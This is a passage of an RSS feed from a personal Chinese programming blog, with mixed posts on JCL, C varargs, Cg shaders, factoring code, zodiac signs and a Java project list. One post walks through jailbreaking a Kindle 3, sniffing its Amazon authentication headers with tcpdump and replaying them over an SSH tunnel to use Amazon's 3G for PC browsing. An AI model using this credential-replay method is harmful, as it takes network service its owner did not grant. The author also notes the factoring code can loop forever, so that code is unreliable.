<P>//ADCDAA&nbsp;&nbsp; JOB 616,HJZ,MSGLEVEL=(1,1),NOTIFY=&amp;SYSUID&nbsp;&nbsp;&nbsp; <BR>//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SET SYSALLDA=3390&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//STEP1&nbsp;&nbsp;&nbsp; EXEC IGYWCL,LNGPRFX=IGY330&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>//COBOL.SYSIN&nbsp; DD DSN=ADCDA.COBOL.SRC(TEST),DISP=SHR&nbsp;&nbsp;&nbsp; <BR>//LKED.SYSLMOD DD DSN=ADCDA.LOAD(TEST),DISP=SHR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
<P>附三：PL1编译JCL</P>
<P>调试中，战斗力不够了</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>MVS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720079284532177/</guid>
    </item>
    <item>
      <title>
<![CDATA[WPF模拟多文档视图]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200910149392236/</link>
      <description>
<![CDATA[画个圈圈以后写]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200910149392236/</guid>
    </item>
    <item>
      <title>
<![CDATA[那快乐的童年]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720119120520349/</link>
      <description>
<![CDATA[国庆在家收玉米，口渴就顺手折了根玉米杆当甘蔗，想起了那快乐的童年。<br>掰玉米，传说鲁班发明锯子是受小草叶子的启发，玉米的叶子虽然没那么厉害，可是也不是吃素的，坚持不带手套的手惨不忍睹。一是疼在感觉有点舒服，二是对自己的皮肤自疗能力有信心，1个星期完全恢复。<br>玉米杆，之前玉米杆要一根一根砍下来，小时候跟在大人后面，找紫色的根的玉米杆，越紫越甜，吃完就在玉米杆堆里蟋蟀，小人喂鸡，大的放到炉灰里烧熟可以吃。现在机器过去全粉碎变肥料了。<br>剥玉米，小时候剥玉米，一边缠着大人讲故事，一边去翻找嫩玉米，然后蒸熟了吃，比卖的玉米有嚼头，卖的玉米太嫩。现在还能吃到嫩玉米，只是不是听故事而是被盘问个人问题。<br>晒玉米，剥下来的玉米要提到房上晒干，小时候比赛往筐子里装玉米也是一件很有成就感的事，08年在家提过一次，4米的高度，边提边流汗的感觉，比桑拿好一些，遗憾的是今年装车时累了，腿疼无力，错过这个享受机会了。<br><br>语文彻底荒废了，写几个字这么费劲。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720119120520349/</guid>
    </item>
    <item>
      <title>
<![CDATA[星座四相-风水火地]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201313115514232/</link>
      <description>
<![CDATA[<div>十二星座的顺序，如水煮篇所说：</div><div>牧羊、金牛、双子、巨蟹、狮子、处女；天秤、天蝎、射手、<span style="line-height: 25px; color: rgb(75, 78, 81); font-family: Arial, Helvetica, simsun, u5b8bu4f53;"  >摩羯、水瓶、双鱼</span></div><div><br></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >第一步是定时间，这十二个星座的起始时间：月份从3开始，日是12343210=&gt;112233443210再调整一个数(处女)</font></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >3月21&nbsp;</font><span style="line-height: 22px;"  >牧羊</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >4月21&nbsp;</font><span style="line-height: 22px;"  >金牛</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >5月22&nbsp;</font><span style="line-height: 22px;"  >双子</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >6月22&nbsp;</font><span style="line-height: 22px;"  >巨蟹</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >7月23&nbsp;</font><span style="line-height: 22px;"  >狮子</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >8月2<b>4&nbsp;</b></font><span style="line-height: 22px;"  >处女</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >9月24&nbsp;</font><span style="line-height: 22px;"  >天秤</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >10月24&nbsp;</font><span style="line-height: 22px;"  >天蝎</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >11月23&nbsp;</font><span style="line-height: 22px;"  >射手</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >12月22&nbsp;</font><span style="line-height: 25px; color: rgb(75, 78, 81); font-family: Arial, Helvetica, simsun, u5b8bu4f53;"  >摩羯</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >1月21&nbsp;</font><span style="line-height: 25px; color: rgb(75, 78, 81); font-family: Arial, Helvetica, simsun, u5b8bu4f53;"  >水瓶</span></div><div><font color="#4b4e51"  face="Arial, Helvetica, simsun, u5b8bu4f53"  >2月20&nbsp;</font><span style="line-height: 25px; color: rgb(75, 78, 81); font-family: Arial, Helvetica, simsun, u5b8bu4f53;"  >双鱼</span></div><div><br></div>第二步是分四相：风水火地，分别是1+4*x，2+4*x，3+4*x，4+4*x月份的星座<div>风：1水瓶, 5双子(1+4), 9天秤(1+4+4)</div><div>水：2双鱼, 6巨蟹(2+4), 10天蝎(2+4+4)</div><div>火：3牧羊, 7狮子(3+4), 11射手(3+4+4)</div><div>地：4金牛, 8处女(4+4), 12摩羯(4+4+4)</div><div>属性：</div><div><div><br></div><div>第三步是分三质：固定变动本位，分别是0+3*x, 1+3*x, 2+3*x月份的星座<br><span style="line-height: 22px;"  >本位：3牧羊座、6巨蟹座、</span><span style="line-height: 22px;"  >9天秤座、</span><span style="line-height: 22px;"  >12摩羯座</span></div><div><span style="line-height: 22px;"  >固定：</span><span style="line-height: 22px;"  >1水瓶座、</span><span style="line-height: 22px;"  >4金牛座、7狮子座、10天蝎座</span></div><div><font face="Times New Roman"  style="line-height: 22px;"  ><span style="font-size: 15px; line-height: 20px;"  >变动：</span></font><span style="line-height: 20px; font-family: 'Times New Roman'; font-size: 15px;"  >2双鱼座、</span><span style="line-height: 20px; font-size: 15px; font-family: 'Times New Roman';"  >5双子座、8处女座、11射手座</span></div></div><div>属性：</div><div>本位，呈现最单纯、原始的状态；</div><div>固定，具有顽固、最难以改变的特质；</div><div>变动，则代表弹性和良好的调适能力。</div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201313115514232/</guid>
    </item>
    <item>
      <title>
<![CDATA[电脑通过Kindle3上网]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372011922104155871/</link>
      <description>
<![CDATA[Kindle3 Wifi+3G 版本, Windows XP<br><br><wbr><br>1. 越狱<br>1.1 获取越狱文件, <br>可以在这里下载http://dl.dropbox.com/u/194885/kindle3/1-kindle-jailbreak-0.6.N.zip<br>最新版本的请到这里下载 http://www.mobileread.com/forums/showthread.php?t=88004<br>1.2 拷贝到Kindle上, 通过USB连接Kindle和电脑, 将update_jailbreak_0.4_k3g_install.bin放到Kindle根目录<br>1.3 安装, 打开Kindle [HOME] -&gt; [MENU] &gt; Settings -&gt; [MENU] &gt; Update Your Kindle<br><br>2. 安装usbnetwork<br>2.1 获取文件 http://dl.dropbox.com/u/194885/kindle3/2-kindle-usbnetwork-0.33.N.zip<br>2.2 拷贝到Kindle上,通过USB连接Kindle和电脑, 将update_usbnetwork_0.35.N_k3g_install.bin放到Kindle根目录<br>2.3 安装, 打开Kindle [HOME] -&gt; [MENU] &gt; Settings -&gt; [MENU] &gt; Update Your Kindle<br><br>3. 安装XP驱动<br>3.1 获取文件 http://dl.dropbox.com/u/194885/kindle3/4-XP-RNDIS-Ethernet-Gadget.rar<br>3.2 解压缩到磁盘<br>3.3 获取tcpdump http://dl.dropbox.com/u/194885/kindle3/6-tcpdump-arm<br>使用USB连接Kindle和电脑, 将6-tcpdump-arm传到Kindle上, 重命名为tcpdump<br>弹出Kindle, 使Kindle处于充电状态<br>3.3 打开Kindle, 按[HOME]<br>随便输入一个字符,然后删除, 再输入命令 ;debugOn 回车<br>随便输入一个字符,然后删除, 再输入命令 ~usbNetwork 回车<br>3.4 使用USB连接Kindle和电脑, Windows会提示发现新硬件, 安装驱动, 选择解压缩得到的文件<br>3.5 查看网络连接, 安装完驱动后，会多一个连接，手动配置这个连接ip地址为192.168.2.1，掩码255.255.255.0<br><br>4. 获取Kindle认证信息<br>4.1 从电脑上登录Kindle, 开始抓包<br>telnet 192.168.2.2<br>cd /mnt/us<br>chmod +x tcpdump<br>./tcpdump -nAi ppp0 -s0 &gt; hjz.log<br>4.2 在Kindle上使用GPRS方式打开一个网页<br>4.3 回到终端<br>查看hjz.log, 找到这两条信息,保存起来, 注意要把x-fsn的几行连成一行<br>x-fsn:xxxxxxxxxxxxx<br>xxxxxxxxxxxxxxxxxxxx<br>x-kn-appId: xxxxxxxxx<br><br>5. 创建反向代理<br>5.1 获取并安装SSH服务器http://dl.dropbox.com/u/194885/kindle3/9-OpenSSH.zip<br>5.2 配置并启动SSH服务器<br>1）运行cmd，进入OpenSSH安装目录的bin目录<br>2）运行“mkgroup -l &gt;&gt; ..\etc\group”命令<br>3）运行“mkpasswd -l -u hankjin &gt;&gt; ..\etc\passwd”<br>注意需是机器上存在的用户，否则出现“mkpasswd: [2221] 用户名找不到”错误。<br>4）运行“net start opensshd”<br>5.3 获取代理IP<br>telnet 192.168.2.2<br>[root@kindle us]# ping fints-g7g.amazon.com<br>PING fints-g7g.amazon.com (72.21.210.242): 56 data bytes<br>64 bytes from 72.21.210.242: seq=0 ttl=244 time=555.759 ms<br>64 bytes from 72.21.210.242: seq=1 ttl=244 time=616.982 ms<br>^C<br>5.4 创建SSH隧道 ssh -R 8000:72.21.210.242:80 hankjin@192.168.2.1<br><br>6. 使用代理浏览网页<br>6.1 安装Firefox<br>6.2 安装Firefox插件 http://dl.dropbox.com/u/194885/kindle3/8-modify_headers-0.7.0.2-fx%2Bsm.xpi<br>6.3 设置认证信息<br>打开Firefox -&gt; Tools -&gt; Modify Headers<br>Action: Add, Header names: x-fsn, Header values: 4.3步获得的数据<br>Action: Add, Header nemes: x-kn-appId, Header values: 4.3步获得的数据<br>点选Options, 选中Always On<br>6.4 设置代理<br>Firefox -&gt; Tools-&gt;Options-&gt;Network -&gt;Setting, 设置代理为127.0.0.1 8000<br>6.5 访问网络, 用火狐打开 http://www.baidu.com/s?wd=IP 应该显示美国IP, 成功越狱, 可惜不支持https代理, 而facebook和twitter登录都需要https, 可以先用其它网络登录facebook并保存密码.]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372011922104155871/</guid>
    </item>
    <item>
      <title>
<![CDATA[FxCop-巨彪悍的.Net分析工具]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009412101238425/</link>
      <description>
<![CDATA[<br>可以把已经编译好的程序中的潜在bug和不良编码习惯都筛选出来。<br><a href="http://img.bimg.126.net/photo/IWMLwga73k4R30nK2SBXkA==/4545257923924384729.jpg" target="_blank"><img title="FxCop-巨彪悍的.Net分析工具 - hankjin - 乱-Blog" alt="FxCop-巨彪悍的.Net分析工具 - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/IWMLwga73k4R30nK2SBXkA==/4545257923924384729.jpg"></a><br>下载地址：<br>http://www.microsoft.com/downloads/details.aspx?familyid=9AEAA970-F281-4FB0-ABA1-D59D7ED09772&amp;displaylang=en<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009412101238425/</guid>
    </item>
    <item>
      <title>
<![CDATA[拉斯维加斯Las Vegas进行整数因子分解]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720109610482862/</link>
      <description>
<![CDATA[X0=random()%n<br>Xi+1 = (Xi * Xi) - 1<br>求(Xi - Xk)与n的最大公约数，如果&gt;1，则是n的因子<br>k是比i小的最大的2^x的值<br>算法好像有问题，有时会进入死循环<br>C++代码和Python代码分别如下：<br>/**<br>* LV@hankjin<br>*/<br>#include &lt;cstdlib&gt;<br>#include &lt;iostream&gt;<br>#include &lt;ctime&gt;<br>using namespace std;<br><br>int gcd(int a, int b){<br>&nbsp;&nbsp;&nbsp; if (b==0) return a;<br>&nbsp;&nbsp;&nbsp; else return gcd(b,a%b);<br>}<br>int lv(int n){<br>&nbsp;&nbsp;&nbsp; int i=1;<br>&nbsp;&nbsp;&nbsp; int k=2;<br>&nbsp;&nbsp;&nbsp; int x=rand()%n;<br>&nbsp;&nbsp;&nbsp; int y=x;<br>&nbsp;&nbsp;&nbsp; while(1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x=(x*x-1)%n;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int d = gcd(y-x,n);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(d&gt;1 &amp;&amp; d&lt;n)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return d;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(i==k){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; y=x;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; k*=2;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; srand(time(NULL));<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;lv(480)&lt;&lt;endl;<br>}<br><br>#!/usr/bin/python<br>import random<br>def gcd(x,y):<br>&nbsp;&nbsp;&nbsp; if y==0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x<br>&nbsp;&nbsp;&nbsp; else:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return gcd(y, x%y)<br>def lv(n):<br>&nbsp;&nbsp;&nbsp; x=random.randint(2,n)<br>&nbsp;&nbsp;&nbsp; y=x<br>&nbsp;&nbsp;&nbsp; i=1<br>&nbsp;&nbsp;&nbsp; k=2<br>&nbsp;&nbsp;&nbsp; while True:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i+=1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x=(x*x-1)%n<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d=gcd(x-y,n)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if d&gt;1 and d&lt;n:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return d<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if i==k:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; y=x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; k*=2<br>print lv(480)]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720109610482862/</guid>
    </item>
    <item>
      <title>
<![CDATA[给直接体绘制DVR增加3D效果]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201052871233830/</link>
      <description>
<![CDATA[<div>FBO 真是个好东西，做三个FBO<br>先Raycaster一个左眼图像到leftFBO里<br>再以y轴为旋转轴向左旋转6度，Raycaster 一个右眼图像到rightFBO里<br>然后以leftFBO和rightFBO为纹理参数，将左图和右图合成一个红蓝3D图像到finalFBO里<br>最后将finalFBO绘制到屏幕上<br>效果如图所示，还是比较令人满意的，当然了，Raycaster两张图片，帧率下降了将近一倍。<br>合成红蓝3D的Cg代码如下所示：<br>void vertex_main(<br>&nbsp;&nbsp;&nbsp; in float2 pos : POSITION,<br>&nbsp;&nbsp;&nbsp; out float4 oPos : POSITION,<br>&nbsp;&nbsp;&nbsp; out float4 coord: TEXCOORD){<br>&nbsp;&nbsp;&nbsp; oPos = float4(pos, 0, 1);<br>&nbsp;&nbsp;&nbsp; coord =&nbsp;&nbsp; (oPos+float4(1,1,0,0))/2;<br>}<br>void fragment_main(<br>&nbsp;&nbsp;&nbsp; in float4 pos: POSITION,<br>&nbsp;&nbsp;&nbsp; in float4 coord: TEXCOORD,<br>&nbsp;&nbsp;&nbsp; out float4 color: COLOR,<br>&nbsp;&nbsp;&nbsp; uniform sampler2D leftFBO,<br>&nbsp;&nbsp;&nbsp; uniform sampler2D rightFBO){&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; float4 leftColor = tex2D(leftFBO, coord.xy);<br>&nbsp;&nbsp;&nbsp; float4 rightColor = tex2D(rightFBO, coord.xy);<br>&nbsp;&nbsp;&nbsp; color = float4(leftColor.r, rightColor.g, rightColor.b, 1);<br>}<br><img title="给直接体绘制DVR增加3D效果 - hankjin - 云水居" alt="给直接体绘制DVR增加3D效果 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/raAL1rhSZtIcrv8DqbJdDw==/929711848075507480.png"></div>&nbsp;<div><img title="给直接体绘制DVR增加3D效果 - hankjin - 云水居" alt="给直接体绘制DVR增加3D效果 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/H5_LH5YdYf7_Ut9alEIs8A==/2342716231163077975.png"></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201052871233830/</guid>
    </item>
    <item>
      <title>
<![CDATA[可变参数--eg: printf(const char *format, ...)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200761144554120/</link>
      <description>
<![CDATA[<OL>
<LI>定义：</LI>
<OL>
<LI>C++的灵活性是无法想像的，一个函数可以有不确定的参数个数。</LI>
<LI>如printf("%s%d%x", str1, int2, addr3);</LI>
<LI>具体实现方法如下</LI>
<OL>
<LI>声明原型，形如void demo(char *msg,...)，注意变长参数的原型声明中至少要含有一个确定参数。</LI>
<LI>用va_list定义保存函数参数的数据结构，可以理解为一个指针变量。</LI>
<LI>用va_start将上一步定义的变量指向第一个可变参数。</LI>
<LI>用va_arg遍历所有的可变参数。</LI>
<LI>用va_end将指针变量持有的地址值置为0。&nbsp;</LI></OL></OL>
<LI>例子：</LI>
<OL>
<LI>eg1<BR>#include &lt;stdio.h&gt;<BR>#include &lt;stdarg.h&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //要包含这个头文件<BR>void variable(int i, ...)<BR>{<BR>&nbsp;&nbsp;&nbsp; int j = 0;<BR>&nbsp;&nbsp;&nbsp; va_list arg_ptr;&nbsp;&nbsp;&nbsp; //第1步,定义这个指向参数列表的变量<BR>&nbsp;&nbsp;&nbsp; va_start(arg_ptr, i);//第2步,把上面这个变量初始化.即让它指向参数列表<BR>&nbsp;&nbsp;&nbsp; while( j != -1 )<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //第3步,获取arg_ptr指向的当前参数.这个参数的类型由va_arg的第2个参数指定<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j = va_arg(arg_ptr, int);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%d ", j);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; va_end(arg_ptr);&nbsp;&nbsp;&nbsp; //第4步,做一些清理工作<BR>}<BR>main()<BR>{<BR>&nbsp;&nbsp;&nbsp; variable(3, 3, 4, 5, 6, -1);<BR>}</LI>
<LI>eg2<BR>#include &lt;stdio.h&gt;<BR>#include &lt;stdarg.h&gt;<BR>void formatoutput(char* format, ...)<BR>{<BR>&nbsp;&nbsp;&nbsp; char s[10];<BR>&nbsp;&nbsp;&nbsp; va_list arg_ptr;<BR>&nbsp;&nbsp;&nbsp; va_start(arg_ptr, format);<BR>&nbsp;&nbsp;&nbsp; _vsnprintf(s, sizeof(s)-1, format, arg_ptr);<BR>&nbsp;&nbsp;&nbsp; printf("%s ", s);<BR>}<BR>void main()<BR>{<BR>&nbsp;&nbsp;&nbsp; formatoutput("%s%s%d", "d", "g",8);<BR>}</LI>
<LI>eg3.<BR>#include &lt;stdio.h&gt;<BR>#include &lt;stdlib.h&gt;<BR>void myprintf(char* fmt, ...)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //一个简单的类似于printf的实现，//参数必须都是int 类型<BR>{<BR>&nbsp;char* pArg=NULL;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //等价于原来的va_list <BR>&nbsp;char c;<BR>&nbsp;pArg = (char*) &amp;fmt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //注意不要写成p = fmt !!因为这里要对//参数取址，而不是取值<BR>&nbsp;pArg += sizeof(fmt);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //等价于原来的va_start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;do{<BR>&nbsp;&nbsp;c =*fmt;<BR>&nbsp;&nbsp;if (c != '%')<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;putchar(c);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //照原样输出字符<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;else<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;//按格式字符输出数据<BR>&nbsp;&nbsp;&nbsp;switch(*++fmt) <BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;case 'd':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%d",*((int*)pArg));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;case 'x':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%#x",*((int*)pArg));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;case 'c':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%c",*((char*)pArg));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;case 's':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%s",*((char**)pArg));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;default:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;pArg += sizeof(int);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //等价于原来的va_arg<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;++fmt;<BR>&nbsp;}while (*fmt != '\0'); <BR>&nbsp;pArg = NULL;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //等价于va_end<BR>&nbsp;return; <BR>}<BR>int main(int argc, char* argv[])<BR>{<BR>&nbsp;int i = 1234;<BR>&nbsp;int j = 5678;<BR>&nbsp;char c = 'a';<BR>&nbsp;char *hi = "hank";<BR>&nbsp;myprintf("the first test:i=%d\n",i,j); <BR>&nbsp;myprintf("the secend test:i=%d; %x;j=%d;\n",i,0xabcd,j); <BR>&nbsp;myprintf("Char %c\n",c);<BR>&nbsp;myprintf("Hello %s and %c\n",hi,c);<BR>&nbsp;return 0;<BR>}</LI></OL></OL>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200761144554120/</guid>
    </item>
    <item>
      <title>
<![CDATA[111个知名Java项目集锦（包括url和描述） ]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200792292048434/</link>
      <description>
<![CDATA[<P style="TEXT-INDENT: 2em;"  >&nbsp;</P>  <P style="TEXT-INDENT: 2em;"  >  <TABLE cellSpacing="0" cellPadding="0" border="1" >  <TBODY>  <TR>  <TH>项目名称</TH>  <TH colSpan="3" rowSpan="112" >&nbsp;</TH>  <TH>项目描述转载自<A rel="nofollow" href="http://andyluo.blogjava.net/"  >http://andyluo.blogjava.net</A></TH></TR>  <TR>  <TD><A rel="nofollow" href="http://asm.objectweb.org/"  >ASM</A> </TD>  <TD>Java bytecode manipulation framework</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://aspectwerkz.codehaus.org/"  >AspectWerkz</A> </TD>  <TD>AspectWerkz - Dynamic AOP for Java</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://ws.apache.org/axis/"  >Axis</A> </TD>  <TD>Axis - an implementation of the SOAP (Simple Object Access Protocol) submission to W3C</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://xml.apache.org/batik/"  >Batik</A> </TD>  <TD>Batik SVG Toolkit - Toolkit using images in the Scalable Vector Graphics (SVG) format</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/bcel"  >BCEL</A> </TD>  <TD>Byte Code Engineering Library - Analyze, create and manipulate Java class files</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/beanutils/"  >BeanUtils</A> </TD>  <TD>BeanUtils - Utilities for working with JavaBeans</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/tomcat/"  >Catalina</A> </TD>  <TD>Catalina - Servlet and JSP based web server</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://objectstyle.org/cayenne/"  >Cayenne</A> </TD>  <TD>Professional Object Relational Mapping</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://cglib.sourceforge.net/"  >CGLIB</A> </TD>  <TD>CGLIB - Dynamic byte code generator转载自<A rel="nofollow" href="http://andyluo.blogjava.net/"  >http://andyluo.blogjava.net</A></TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/chain/"  >Chain</A> </TD>  <TD>Chain - Implementation of the GoF "Chain of Responsibility" pattern</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://checkstyle.sourceforge.net/"  >Checkstyle</A> </TD>  <TD>Checkstyle - Development tool to help writing Java code that adheres to a coding standard</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/cli/"  >CLI</A> </TD>  <TD>Command Line Library - Simple API for working with the command line arguments and options</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/codec/"  >Codec</A> </TD>  <TD>Commons Codec - Encoders and decoders like Base64, Hex, phonetic encodings and URLs</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/collections/"  >Collections</A> </TD>  <TD>Collections - Filling the holes left in Sun's Collections API</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/configuration/"  >Configuration</A> </TD>  <TD>Commons Configuration - Generic API enabling configuration from a variety of sources</TD></TR>  <TR>  <TD><A rel="nofollow" href="http://jakarta.apache.org/commons/dbcp/"  >DBCP</A> </TD>  